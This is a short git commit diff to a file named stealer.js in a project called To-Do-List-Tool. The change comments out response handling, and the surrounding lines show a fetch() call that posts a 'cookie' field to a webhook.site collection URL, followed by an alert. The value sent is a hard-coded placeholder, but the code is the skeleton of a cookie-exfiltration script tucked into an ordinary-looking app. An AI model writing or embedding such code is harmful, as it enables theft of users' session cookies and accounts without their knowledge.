2dc3fb0e8cfc8564c918f19d51d31f7e09fdc25e
CodeOfMuscles <146719124+CodeOfMuscles@users.noreply.github.com>
2024-08-30 15:26:39 +0200

    Update stealer.js

--- To-Do-List-Tool/stealer.js
+++ To-Do-List-Tool/stealer.js
@@ -8,8 +8,8 @@ fetch('https://webhook.site/f21dc15a-d8b4-468b-9221-60fd48267bcc', {
         cookie: "ahmed",
     }) // The data you want to send in the request body
 })
-.then(response => response.text()) // Can also use .json() if expecting JSON response
-.then(data => console.log('Success:', data))
-.catch(error => console.error('Error:', error));
+// .then(response => response.text()) // Can also use .json() if expecting JSON response
+// .then(data => console.log('Success:', data))
+// .catch(error => console.error('Error:', error));
 
 alert("smil");
